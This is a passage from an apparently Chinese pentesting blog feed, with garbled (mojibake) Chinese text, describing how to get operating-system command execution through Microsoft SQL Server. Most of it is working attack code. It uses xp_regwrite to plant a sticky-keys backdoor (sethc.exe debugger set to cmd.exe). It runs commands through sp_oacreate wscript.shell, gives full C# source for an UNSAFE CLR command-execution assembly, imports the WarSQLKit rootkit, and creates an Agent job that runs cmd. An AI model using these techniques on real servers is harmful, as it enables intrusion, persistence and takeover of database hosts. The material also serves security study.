comment"># åˆ¤æ–­å­å¥æ˜¯å¦å­˜åœ¨</span></code></pre><h3 id="xp-regaddmultistring-æšä¸¾å¯ç”¨çš„æ³¨å†Œè¡¨é”®å€¼"><a href="#xp-regaddmultistring-æšä¸¾å¯ç”¨çš„æ³¨å†Œè¡¨é”®å€¼" class="headerlink" title="xp_regaddmultistring æšä¸¾å¯ç”¨çš„æ³¨å†Œè¡¨é”®å€¼"></a>xp_regaddmultistring æšä¸¾å¯ç”¨çš„æ³¨å†Œè¡¨é”®å€¼</h3><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> xp_regenumkeys <span class="token string">'HKEY_CURRENT_USER'</span><span class="token punctuation">,</span><span class="token string">'Control Panel\International'</span></code></pre><h3 id="xp-regwrite-ä¿®æ”¹æ³¨å†Œè¡¨"><a href="#xp-regwrite-ä¿®æ”¹æ³¨å†Œè¡¨" class="headerlink" title="xp_regwrite ä¿®æ”¹æ³¨å†Œè¡¨"></a>xp_regwrite ä¿®æ”¹æ³¨å†Œè¡¨</h3><p>æŸ¥çœ‹ xp_regwrite æ˜¯å¦å¯ç”¨</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysobjects <span class="token keyword">where</span> xtype<span class="token operator">=</span><span class="token string">'x'</span> <span class="token operator">and</span> name<span class="token operator">=</span><span class="token string">'xp_regwrite'</span></code></pre><p>å¼€å¯ xp_regwrite</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token keyword">RECONFIGURE</span><span class="token keyword">EXEC</span> sp_configure <span class="token string">'xp_regwrite'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token keyword">RECONFIGURE</span></code></pre><p>å…³é—­ xp_regwrite</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token keyword">RECONFIGURE</span><span class="token keyword">EXEC</span> sp_configure <span class="token string">'xp_regwrite'</span><span class="token punctuation">,</span> <span class="token number">0</span> <span class="token keyword">RECONFIGURE</span></code></pre><p>ä¿®æ”¹æ³¨å†Œè¡¨</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> xp_regwrite <span class="token variable">@rootkey</span><span class="token operator">=</span><span class="token string">'HKEY_LOCAL_MACHINE'</span><span class="token punctuation">,</span><span class="token variable">@key</span><span class="token operator">=</span><span class="token string">'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.EXE'</span><span class="token punctuation">,</span><span class="token variable">@value_name</span><span class="token operator">=</span><span class="token string">'Debugger'</span><span class="token punctuation">,</span><span class="token variable">@type</span><span class="token operator">=</span><span class="token string">'REG_SZ'</span><span class="token punctuation">,</span><span class="token variable">@value</span><span class="token operator">=</span><span class="token string">'c:\windows\system32\cmd.exe'</span><span class="token comment"># ä¿®æ”¹ç²˜æ»é”®çš„é”®å€¼</span></code></pre><h3 id="xp-regdeletekey-åˆ é™¤æŒ‡å®šæ³¨å†Œè¡¨é”®å€¼å¯¹"><a href="#xp-regdeletekey-åˆ é™¤æŒ‡å®šæ³¨å†Œè¡¨é”®å€¼å¯¹" class="headerlink" title="xp_regdeletekey åˆ é™¤æŒ‡å®šæ³¨å†Œè¡¨é”®å€¼å¯¹"></a>xp_regdeletekey åˆ é™¤æŒ‡å®šæ³¨å†Œè¡¨é”®å€¼å¯¹</h3><p>åˆ é™¤ç²˜æ»é”®çš„é”®å€¼</p><pre class="language-sql" data-language="sql"><code class="language-sql">xp_regdeletekey <span class="token string">'HKEY_LOCAL_MACHINE'</span><span class="token punctuation">,</span> <span class="token string">'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe'</span></code></pre><h2 id="xp-fileexist"><a href="#xp-fileexist" class="headerlink" title="xp_fileexist"></a>xp_fileexist</h2><p>åˆ¤è¯»æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œç¬¬ä¸€åˆ—è¿”å› 0 è¡¨ç¤ºæ–‡ä»¶ä¸å­˜åœ¨ï¼Œè¿”å› 1 è¡¨ç¤ºæ–‡ä»¶å­˜åœ¨ã€‚å½“æ‰§è¡Œå®Œæ— å›æ˜¾å‘½ä»¤æ—¶ï¼Œä¸€èˆ¬éƒ½å°†ç»“æœè¾“å…¥è‡³æ–‡ä»¶ä¸­ï¼Œåˆ©ç”¨æ­¤å­˜å‚¨è¿‡ç¨‹å¯ä»¥åˆ¤æ–­æ— å›æ˜¾å‘½ä»¤æ˜¯å¦æ‰§è¡ŒæˆåŠŸ</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> xp_fileexist <span class="token string">'C:\Users\MSSQLSERVER\1.txt'</span></code></pre><h2 id="xp-subdirs"><a href="#xp-subdirs" class="headerlink" title="xp_subdirs"></a>xp_subdirs</h2><p>åˆ—å‡ºå½“å‰ç›®å½•</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> xp_subdirs <span class="token string">"C:\\"</span></code></pre><h2 id="xp-getnetname"><a href="#xp-getnetname" class="headerlink" title="xp_getnetname"></a>xp_getnetname</h2><p>è·å–æœåŠ¡å™¨åç§°</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> xp_getnetname</code></pre><h2 id="xp-msver"><a href="#xp-msver" class="headerlink" title="xp_msver"></a>xp_msver</h2><p>è·å–æœåŠ¡å™¨ä¿¡æ¯</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> xp_msver</code></pre><h1 id="SQL-Server-COM-ç»„ä»¶"><a href="#SQL-Server-COM-ç»„ä»¶" class="headerlink" title="SQL Server COM ç»„ä»¶"></a>SQL Server COM ç»„ä»¶</h1><p>SQL Server ä¸­çš„ COM ç»„ä»¶ SP_OACREATEï¼Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œä½†æ˜¯æ­¤åˆ©ç”¨æ–¹æ³•æ— å›æ˜¾</p><h2 id="æŸ¥è¯¢-SP-OACREATE-æ˜¯å¦å­˜åœ¨"><a href="#æŸ¥è¯¢-SP-OACREATE-æ˜¯å¦å­˜åœ¨" class="headerlink" title="æŸ¥è¯¢ SP_OACREATE æ˜¯å¦å­˜åœ¨"></a>æŸ¥è¯¢ SP_OACREATE æ˜¯å¦å­˜åœ¨</h2><p>è¿”å› 1 åˆ™å­˜åœ¨</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysobjects <span class="token keyword">where</span> xtype<span class="token operator">=</span><span class="token string">'x'</span> <span class="token operator">and</span> name<span class="token operator">=</span><span class="token string">'SP_OACREATE'</span></code></pre><h2 id="SP-OACREATE-çš„å¼€å¯ä¸å…³é—­"><a href="#SP-OACREATE-çš„å¼€å¯ä¸å…³é—­" class="headerlink" title="SP_OACREATE çš„å¼€å¯ä¸å…³é—­"></a>SP_OACREATE çš„å¼€å¯ä¸å…³é—­</h2><p>å¼€å¯</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token keyword">RECONFIGURE</span> <span class="token keyword">WITH</span> OVERRIDE<span class="token punctuation">;</span>   <span class="token keyword">exec</span> sp_configure <span class="token string">'Ole Automation Procedures'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token keyword">RECONFIGURE</span> <span class="token keyword">WITH</span> OVERRIDE<span class="token punctuation">;</span></code></pre><p>å…³é—­</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token keyword">RECONFIGURE</span> <span class="token keyword">WITH</span> OVERRIDE<span class="token punctuation">;</span>   <span class="token keyword">exec</span> sp_configure <span class="token string">'Ole Automation Procedures'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token keyword">RECONFIGURE</span> <span class="token keyword">WITH</span> OVERRIDE<span class="token punctuation">;</span></code></pre><h2 id="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"><a href="#æ‰§è¡Œç³»ç»Ÿå‘½ä»¤" class="headerlink" title="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"></a>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</h2><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">declare</span> <span class="token variable">@shell</span> <span class="token keyword">int</span> <span class="token keyword">exec</span> sp_oacreate <span class="token string">'wscript.shell'</span><span class="token punctuation">,</span><span class="token variable">@shell</span> output <span class="token keyword">exec</span> sp_oamethod <span class="token variable">@shell</span><span class="token punctuation">,</span><span class="token string">'run'</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token string">'C:\Windows\System32\cmd.exe /c whoami /all > C:\\Users\\MSSQLSERVER\\test.txt'</span></code></pre><h1 id="SQL-Server-CLR-ç›¸å…³åˆ©ç”¨"><a href="#SQL-Server-CLR-ç›¸å…³åˆ©ç”¨" class="headerlink" title="SQL Server CLR ç›¸å…³åˆ©ç”¨"></a>SQL Server CLR ç›¸å…³åˆ©ç”¨</h1><p>å…¬å…±è¯­è¨€è¿è¡Œæ—¶ (CLR) é›†æˆç¼–ç¨‹æ¦‚å¿µ<br>ä» SQL Server 2005 (9.x) å¼€å§‹ï¼ŒSQL Server é›†æˆäº†ç”¨äº Microsoft Windows çš„ .NET Framework çš„å…¬å…±è¯­è¨€è¿è¡Œæ—¶ (CLR) ç»„ä»¶ã€‚ è¿™æ„å‘³ç€ç°åœ¨å¯ä»¥ä½¿ç”¨ä»»ä½• .NET Framework è¯­è¨€ï¼ˆåŒ…æ‹¬ Microsoft Visual Basic .NET å’Œ Microsoft Visual C#ï¼‰æ¥ç¼–å†™å­˜å‚¨è¿‡ç¨‹ã€è§¦å‘å™¨ã€ç”¨æˆ·å®šä¹‰ç±»å‹ã€ç”¨æˆ·å®šä¹‰å‡½æ•°ã€ç”¨æˆ·å®šä¹‰èšåˆå’Œæµå¼è¡¨å€¼å‡½æ•°</p><p>CLR æ–¹å¼å¯ä»¥åˆ©ç”¨ 16 è¿›åˆ¶æ–‡ä»¶æµæ–¹å¼å¯¼å…¥ DLL æ–‡ä»¶ï¼Œä¸éœ€è¦æ–‡ä»¶è½åœ°</p><p>åˆ©ç”¨æ­¥éª¤</p><ol><li>ç¼–å†™ CLR</li><li>å¯ç”¨ MSSQL CLR åŠŸèƒ½</li><li>åˆ©ç”¨ SQL è¯­å¥å¯¼å…¥ç¨‹åºé›†</li><li>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</li></ol><h2 id="ç¼–å†™-CLR"><a href="#ç¼–å†™-CLR" class="headerlink" title="ç¼–å†™ CLR"></a>ç¼–å†™ CLR</h2><p>ä½¿ç”¨ Visual Studio åˆ›å»ºå·¥ç¨‹</p><p><img src="/posts/5beaca16/image-20220320205141716.png" alt="image-20220320205141716"></p><p>ä¿®æ”¹ç›®æ ‡å¹³å°å’Œå‹¾é€‰åˆ›å»ºè„šæœ¬ï¼Œè¿™é‡Œæ˜¯ SQL Server 2014</p><p><img src="/posts/5beaca16/image-20220320205354905.png" alt="image-20220320205354905"></p><p>ä¿®æ”¹ç›®æ ‡æ¡†æ¶å’Œæƒé™çº§åˆ«ä¸º UNSAFE</p><p><img src="/posts/5beaca16/image-20220320205406216.png" alt="image-20220320205406216"></p><blockquote><p>åœ¨ SQL Server 2005 ä¸­å¼•å…¥äº†ä» MSSQL è¿è¡Œ.NET ä»£ç çš„åŠŸèƒ½ï¼Œå¹¶åœ¨åç»­ç‰ˆæœ¬ä¸­å åŠ äº†è®¸å¤šä¿æŠ¤æªæ–½ï¼Œæ¥é™åˆ¶ä»£ç å¯ä»¥è®¿é—®çš„å†…å®¹ã€‚åœ¨åˆ›å»º.Net ç¨‹åºé›†æ—¶ï¼Œä¼šç»™å®ƒä»¬æŒ‡å®šä¸€ä¸ªæƒé™çº§åˆ«<br>å…¶æƒé™é›†æœ‰ä¸‰ä¸ªé€‰é¡¹</p><blockquote><p>SAFEï¼šåŸºæœ¬ä¸Šåªå°† MSSQL æ•°æ®é›†æš´éœ²ç»™ä»£ç ï¼Œå…¶ä»–å¤§éƒ¨åˆ†æ“ä½œåˆ™éƒ½è¢«ç¦æ­¢<br>EXTERNAL_ACCESSï¼šå…è®¸è®¿é—®åº•å±‚æœåŠ¡å™¨ä¸ŠæŸäº›èµ„æºï¼Œä½†ä¸åº”è¯¥å…è®¸ç›´æ¥æ‰§è¡Œä»£ç <br>UNSAFEï¼šå…è®¸ä½¿ç”¨ä»»ä½•ä»£ç </p></blockquote></blockquote><p>åˆ›å»º SQL CLR C# å­˜å‚¨è¿‡ç¨‹</p><p><img src="/posts/5beaca16/image-20220320205413749.png" alt="image-20220320205413749"></p><p>ä»£ç å¦‚ä¸‹</p><pre class="language-c#" data-language="c#"><code class="language-c#">using System;using System.Data;using System.Data.SqlClient;using System.Data.SqlTypes;using System.Diagnostics;using System.Text;using Microsoft.SqlServer.Server;public partial class StoredProcedures&#123;    [Microsoft.SqlServer.Server.SqlProcedure]    public static void ExecCommand (string cmd)    &#123;        &#x2F;&#x2F; åœ¨æ­¤å¤„æ”¾ç½®ä»£ç         SqlContext.Pipe.Send(&quot;Command is running, please wait.&quot;);        SqlContext.Pipe.Send(RunCommand(&quot;cmd.exe&quot;, &quot; &#x2F;c &quot; + cmd));    &#125;    public static string RunCommand(string filename,string arguments)    &#123;        var process &#x3D; new Process();        process.StartInfo.FileName &#x3D; filename;        if (!string.IsNullOrEmpty(arguments))        &#123;            process.StartInfo.Arguments &#x3D; arguments;        &#125;        process.StartInfo.CreateNoWindow &#x3D; true;        process.StartInfo.WindowStyle &#x3D; ProcessWindowStyle.Hidden;        process.StartInfo.UseShellExecute &#x3D; false;        process.StartInfo.RedirectStandardError &#x3D; true;        process.StartInfo.RedirectStandardOutput &#x3D; true;        var stdOutput &#x3D; new StringBuilder();        process.OutputDataReceived +&#x3D; (sender, args) &#x3D;&gt; stdOutput.AppendLine(args.Data);        string stdError &#x3D; null;        try        &#123;            process.Start();            process.BeginOutputReadLine();            stdError &#x3D; process.StandardError.ReadToEnd();            process.WaitForExit();        &#125;        catch (Exception e)        &#123;            SqlContext.Pipe.Send(e.Message);        &#125;        if (process.ExitCode &#x3D;&#x3D; 0)        &#123;            SqlContext.Pipe.Send(stdOutput.ToString());        &#125;        else        &#123;            var message &#x3D; new StringBuilder();            if (!string.IsNullOrEmpty(stdError))            &#123;                message.AppendLine(stdError);            &#125;            if (stdOutput.Length !&#x3D; 0)            &#123;                message.AppendLine(&quot;Std output:&quot;);                message.AppendLine(stdOutput.ToString());            &#125;            SqlContext.Pipe.Send(filename + arguments + &quot; finished with exit code &#x3D; &quot; + process.ExitCode + &quot;: &quot; + message);        &#125;        return stdOutput.ToString();    &#125;&#125;</code></pre><p>ç¼–è¯‘ç”Ÿæˆ DLL</p><p><img src="/posts/5beaca16/image-20220320205430338.png" alt="image-20220320205430338"></p><h2 id="å¯ç”¨-CLR"><a href="#å¯ç”¨-CLR" class="headerlink" title="å¯ç”¨ CLR"></a>å¯ç”¨ CLR</h2><h3 id="SQL-Server-2017-ç‰ˆæœ¬ä¹‹å‰"><a href="#SQL-Server-2017-ç‰ˆæœ¬ä¹‹å‰" class="headerlink" title="SQL Server 2017 ç‰ˆæœ¬ä¹‹å‰"></a>SQL Server 2017 ç‰ˆæœ¬ä¹‹å‰</h3><pre class="language-sql" data-language="sql"><code class="language-sql">sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span> <span class="token comment">-- æ˜¾ç¤ºé«˜çº§é€‰é¡¹</span>sp_configure <span class="token string">'clr enabled'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span> <span class="token comment">-- å¯ç”¨CLR</span><span class="token keyword">ALTER</span> <span class="token keyword">DATABASE</span> master <span class="token keyword">SET</span> TRUSTWORTHY <span class="token keyword">ON</span><span class="token punctuation">;</span> <span class="token comment">-- å°†å­˜å‚¨.Netç¨‹åºé›†çš„æ•°æ®åº“é…ç½®ä¸ºå¯ä¿¡èµ–çš„</span></code></pre><h3 id="SQL-Server-2017-ç‰ˆæœ¬åŠä¹‹å"><a href="#SQL-Server-2017-ç‰ˆæœ¬åŠä¹‹å" class="headerlink" title="SQL Server 2017 ç‰ˆæœ¬åŠä¹‹å"></a>SQL Server 2017 ç‰ˆæœ¬åŠä¹‹å</h3><pre class="language-sql" data-language="sql"><code class="language-sql">sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span>sp_configure <span class="token string">'clr enabled'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span>sp_add_trusted_assembly <span class="token variable">@hash</span><span class="token operator">=</span> <span class="token operator">&lt;</span>SHA512 <span class="token keyword">of</span> DLL<span class="token operator">></span><span class="token punctuation">;</span> <span class="token comment">-- å°†æŸç¨‹åºé›†çš„SHA512å“ˆå¸Œå€¼æ·»åŠ åˆ°å¯ä¿¡ç¨‹åºé›†åˆ—è¡¨ä¸­</span></code></pre><h2 id="ç¨‹åºé›†çš„å¯¼å…¥å’Œåˆ›å»º"><a href="#ç¨‹åºé›†çš„å¯¼å…¥å’Œåˆ›å»º" class="headerlink" title="ç¨‹åºé›†çš„å¯¼å…¥å’Œåˆ›å»º"></a>ç¨‹åºé›†çš„å¯¼å…¥å’Œåˆ›å»º</h2><p>é€šè¿‡åå…­è¿›åˆ¶å­—ç¬¦ä¸²åˆ›å»ºç¨‹åºé›†</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> ASSEMBLY clrassem <span class="token keyword">from</span> <span class="token operator">&lt;</span>HEX STRING<span class="token operator">></span> <span class="token keyword">WITH</span> PERMISSION_SET <span class="token operator">=</span> UNSAFE</code></pre><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> ASSEMBLY <span class="token punctuation">[</span>CLR<span class="token punctuation">]</span>  <span class="token keyword">AUTHORIZATION</span> <span class="token punctuation">[</span>dbo<span class="token punctuation">]</span>  <span class="token keyword">FROM</span> <span class="token number">0x4d5a</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token keyword">WITH</span> PERMISSION_SET <span class="token operator">=</span> UNSAFE<span class="token punctuation">;</span>GO</code></pre><p>åˆ›å»ºå­˜å‚¨è¿‡ç¨‹ï¼Œä»¥ä»ç¨‹åºé›†è¿è¡Œä»£ç </p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">PROCEDURE</span> debugrun <span class="token keyword">AS</span> EXTERNAL NAME clrassem<span class="token punctuation">.</span>StoredProcedures<span class="token punctuation">.</span>runner</code></pre><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">PROCEDURE</span> <span class="token punctuation">[</span>dbo<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">[</span>ExecCommand<span class="token punctuation">]</span><span class="token variable">@cmd</span> NVARCHAR <span class="token punctuation">(</span>MAX<span class="token punctuation">)</span><span class="token keyword">AS</span> EXTERNAL NAME <span class="token punctuation">[</span>CLR<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">[</span>StoredProcedures<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">[</span>ExecCommand<span class="token punctuation">]</span>go</code></pre><h2 id="åˆ©ç”¨-CLR-æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"><a href="#åˆ©ç”¨-CLR-æ‰§è¡Œç³»ç»Ÿå‘½ä»¤" class="headerlink" title="åˆ©ç”¨ CLR æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"></a>åˆ©ç”¨ CLR æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</h2><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> dbo<span class="token punctuation">.</span>ExecCommand <span class="token string">"whoami /all"</span></code></pre><h2 id="åˆ é™¤å­˜å‚¨è¿‡ç¨‹ã€ç¨‹åºé›†ä»¥åŠå—ä¿¡ä»»çš„å“ˆå¸Œå€¼"><a href="#åˆ é™¤å­˜å‚¨è¿‡ç¨‹ã€ç¨‹åºé›†ä»¥åŠå—ä¿¡ä»»çš„å“ˆå¸Œå€¼" class="headerlink" title="åˆ é™¤å­˜å‚¨è¿‡ç¨‹ã€ç¨‹åºé›†ä»¥åŠå—ä¿¡ä»»çš„å“ˆå¸Œå€¼"></a>åˆ é™¤å­˜å‚¨è¿‡ç¨‹ã€ç¨‹åºé›†ä»¥åŠå—ä¿¡ä»»çš„å“ˆå¸Œå€¼</h2><h3 id="SQL-Server-2017-ä¹‹å‰çš„ç‰ˆæœ¬"><a href="#SQL-Server-2017-ä¹‹å‰çš„ç‰ˆæœ¬" class="headerlink" title="SQL Server 2017 ä¹‹å‰çš„ç‰ˆæœ¬"></a>SQL Server 2017 ä¹‹å‰çš„ç‰ˆæœ¬</h3><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">DATABASE</span> <span class="token operator">&lt;</span>CONNECTED <span class="token keyword">DATABASE</span><span class="token operator">></span> <span class="token keyword">SET</span> TRUSTWORTHY <span class="token keyword">OFF</span></code></pre><h3 id="SQL-Server-2017-åŠæ›´é«˜ç‰ˆæœ¬"><a href="#SQL-Server-2017-åŠæ›´é«˜ç‰ˆæœ¬" class="headerlink" title="SQL Server 2017 åŠæ›´é«˜ç‰ˆæœ¬"></a>SQL Server 2017 åŠæ›´é«˜ç‰ˆæœ¬</h3><pre class="language-sql" data-language="sql"><code class="language-sql">sp_drop_trusted_assembly <span class="token variable">@hash</span><span class="token operator">=</span><span class="token operator">&lt;</span>SHA512 <span class="token keyword">of</span> DLL<span class="token operator">></span></code></pre><h3 id="é€šç”¨"><a href="#é€šç”¨" class="headerlink" title="é€šç”¨"></a>é€šç”¨</h3><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DROP</span> <span class="token keyword">PROCEDURE</span> debugrun<span class="token punctuation">;</span><span class="token keyword">DROP</span> ASSEMBLY clrassem<span class="token punctuation">;</span>sp_configure <span class="token string">'clr strict security'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span>sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span></code></pre><h2 id="WarSQLKit"><a href="#WarSQLKit" class="headerlink" title="WarSQLKit"></a>WarSQLKit</h2><p>WarSQLKit æ˜¯ä¸€ä¸ªé’ˆå¯¹ MSSQL CLR è¿›è¡Œåˆ©ç”¨çš„å·¥å…·ï¼Œæœ‰ä»¥ä¸‹ä¸¤ä¸ªç‰ˆæœ¬</p><ul><li>WarSQLKit æ˜¯å®Œå…¨ç‰ˆæœ¬ï¼Œå†…ç½®å¤šç§åŠŸèƒ½ã€‚</li><li>WarSQLKitMinimal æ˜¯ç®€åŒ–ç‰ˆï¼Œåªèƒ½æ‰§è¡Œå‘½ä»¤ã€‚</li></ul><p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/EPICROUTERSS/MSSQL-Fileless-Rootkit-WarSQLKit">https://github.com/EPICROUTERSS/MSSQL-Fileless-Rootkit-WarSQLKit</a></p><p>å¯¼å…¥æ–¹å¼å’Œå‰é¢å·®ä¸å¤š</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># å¯¼å…¥</span><span class="token keyword">CREATE</span> ASSEMBLY <span class="token punctuation">[</span>WarSQLKit<span class="token punctuation">]</span>    <span class="token keyword">AUTHORIZATION</span> <span class="token punctuation">[</span>dbo<span class="token punctuation">]</span>    <span class="token keyword">FROM</span> <span class="token number">0x4D5A</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">WITH</span> PERMISSION_SET <span class="token operator">=</span> UNSAFE<span class="token punctuation">;</span>GO<span class="token comment"># åˆ›å»º</span><span class="token keyword">CREATE</span> <span class="token keyword">PROCEDURE</span> sp_cmdExec<span class="token variable">@Command</span> <span class="token punctuation">[</span>nvarchar<span class="token punctuation">]</span><span class="token punctuation">(</span>max<span class="token punctuation">)</span><span class="token keyword">WITH</span> <span class="token keyword">EXECUTE</span> <span class="token keyword">AS</span> CALLER<span class="token keyword">AS</span>EXTERNAL NAME WarSQLKit<span class="token punctuation">.</span>StoredProcedures<span class="token punctuation">.</span>CmdExecGO</code></pre><p>ç”¨æ³•è§ README</p><h1 id="SQL-Server-Agent-Job-ä»£ç†æ‰§è¡Œè®¡åˆ’ä»»åŠ¡åˆ©ç”¨"><a href="#SQL-Server-Agent-Job-ä»£ç†æ‰§è¡Œè®¡åˆ’ä»»åŠ¡åˆ©ç”¨" class="headerlink" title="SQL Server Agent Job ä»£ç†æ‰§è¡Œè®¡åˆ’ä»»åŠ¡åˆ©ç”¨"></a>SQL Server Agent Job ä»£ç†æ‰§è¡Œè®¡åˆ’ä»»åŠ¡åˆ©ç”¨</h1><p>SQL Server ä»£ç†æ˜¯ä¸€é¡¹ Microsoft Windows æœåŠ¡ï¼Œå®ƒæ‰§è¡Œè®¡åˆ’çš„ç®¡ç†ä»»åŠ¡ï¼Œè¿™äº›ä»»åŠ¡åœ¨ SQL Server ä¸­ç§°ä¸ºä½œä¸š</p><p>åœ¨ Sql Server é…ç½®ç®¡ç†å™¨ï¼Œå¯ç”¨ SQL Server ä»£ç†ï¼Œæ³¨æ„ Express ç‰ˆæœ¬ Sql Server æ˜¯æ— æ³•å¯ç”¨çš„</p><p>åˆ›å»ºè®¡åˆ’ä»»åŠ¡</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">USE</span> msdb<span class="token punctuation">;</span> <span class="token keyword">EXEC</span> dbo<span class="token punctuation">.</span>sp_add_job <span class="token variable">@job_name</span> <span class="token operator">=</span> N<span class="token string">'test_powershell_job1'</span><span class="token punctuation">;</span> <span class="token keyword">EXEC</span> sp_add_jobstep <span class="token variable">@job_name</span> <span class="token operator">=</span> N<span class="token string">'test_powershell_job1'</span><span class="token punctuation">,</span> <span class="token variable">@step_name</span> <span class="token operator">=</span> N<span class="token string">'test_powershell_name1'</span><span class="token punctuation">,</span> <span class="token variable">@subsystem</span> <span class="token operator">=</span> N<span class="token string">'PowerShell'</span><span class="token punctuation">,</span> <span class="token variable">@command</span> <span class="token operator">=</span> N<span class="token string">'c:\windows\system32\cmd.exe /c whoami >c:\\1.txt'</span><span class="token punctuation">,</span> <span class="token variable">@retry_attempts</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token variable">@retry_interval</span> <span class="token operator">=</span> <span class="token number">5</span> <span class="token punctuation">;</span><span class="token keyword">EXEC</span> dbo<span class="token punctuation">.</span>sp_add_jobserver <span class="token variable">@job_name</span> <span class="token operator">=</span> N<span class="token string">'test_powershell_job1'</span><span class="token punctuation">;</span> <span class="token keyword">EXEC</span> dbo<span class="token punctuation">.</span>sp_start_job N<span class="token string">'test_powershell_job1'</span><span class="token punctuation">;</span></code></pre><h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><p><a href="https://xz.aliyun.com/t/9475">https://xz.aliyun.com/t/9475</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> MSSQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Adfind å¸¸ç”¨å‘½ä»¤</title>
      <link href="/posts/1385ebc.html"/>
      <url>/posts/1385ebc.html</url>
      
